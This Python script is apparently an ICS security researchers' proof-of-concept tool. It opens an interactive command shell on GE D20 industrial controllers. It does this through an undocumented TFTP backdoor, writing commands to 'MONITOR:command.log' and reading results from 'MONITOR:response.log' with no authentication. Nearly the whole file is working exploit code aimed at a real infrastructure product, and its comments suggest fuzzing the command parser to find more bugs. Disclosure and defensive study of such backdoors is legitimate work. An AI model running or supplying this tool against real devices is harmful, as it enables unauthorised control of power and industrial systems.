#!/usr/bin/python
#
# The GE D20 (and possibly other GE D series) use a backdoor tftp command channel using two special files
# To issue a command, send a file "MONITOR:command.log" to the target.
# To read the command response, retrieve the file "MONITOR:response.log"
# The file command.log must be formatted as follows:
# (<command>\x0d\x0a)*\x00
# More than one command may be issued in a single request file
# if more than one command is sent, each command must be ended with a \x0d\x0a.  The file
# must be terminated with a \x00.
# Fuzzing of this format will probably yield bugs in the command parser.  In particular,
# the input length for a single command should be checked.  Note that you shouldn't try to get
# other filenames on the D20 (they cause crashes).
#
#
# Please note:
# This program requires version 0.6.0 or higher of tftpy.  Ubuntu and other debian distros only include up
# to 0.5.1 via their package management systems.
# version 0.5.1 will give you various errors...

import tftpy
import time

# Get the MONITOR:response.log file from the D20
# Note that some commands have extremely long timeouts.  You will receive a permissions error 
# if the command hasn't finished executing yet.  Dumping large amounts of memory or using network
# commands (such as PING) will usually cause these delays.
def getResponse(host):
    client = tftpy.TftpClient(host, 69)
    try:
        client.download('MONITOR:response.log', '/tmp/m68kresp')
    except:
        print "Error encountered with command, please wait 10 seconds for the D20 to respond"
        time.sleep(10)
        try:
            client.download('MONITOR:response.log', '/tmp/m68kresp')
        except:
            print "No response after 10 seconds.  You may have manually retrieve MONITOR:response.log"
            print "Do this by typing '::get' on the command prompt"
            return
    respfile = open("/tmp/m68kresp",'r')
    lines = respfile.readlines()
    counter = 0
    for line in lines:
        #the first few lines are garbage
        if counter < 5:
            counter = counter + 1
            continue
        tline = line.strip()
        if tline[0:3] != "D20":
            print tline

# Build a MONITOR:command.log file and send it to the D20
def sendCmd(host):
    cmdfile = open("/tmp/m68kcmd", 'wb')
    cmdfile.write(cmd + '\x0d\x0a\x00')
    cmdfile.close()
    client = tftpy.TftpClient(host, 69, options={'blksize': 2048, 'timeout':2})
    try:
        client.upload('MONITOR:command.log', '/tmp/m68kcmd')
    except:
        print "Exception encountered sending your command (is the D20 up?)"
        print "Type '::host' to set a new host"
        return 1
    return 0

# The main program follows

print "Welcome to the D20ME Application Monitor!"
host = raw_input("Give me a host to connect to: ")
print "Type 'help' for a list of commands supported by your D20"
while True:
    try:
        cmd = raw_input("D20MEA> ")
    except KeyboardInterrupt:
        print ""
        print "Thanks for using the D20 CLI Backdoor, "
        print "  brought to you by @ReverseICS, @DigitalBond (and GE)"
        exit()
    if "::get" == cmd:
        getResponse(host)
    elif "::host" == cmd:
        host = raw_input("Give me a host to connect to: ")
    elif "" == cmd:
        continue
    else:
        if 0 == sendCmd(host):
            time.sleep(1)
            getResponse(host)
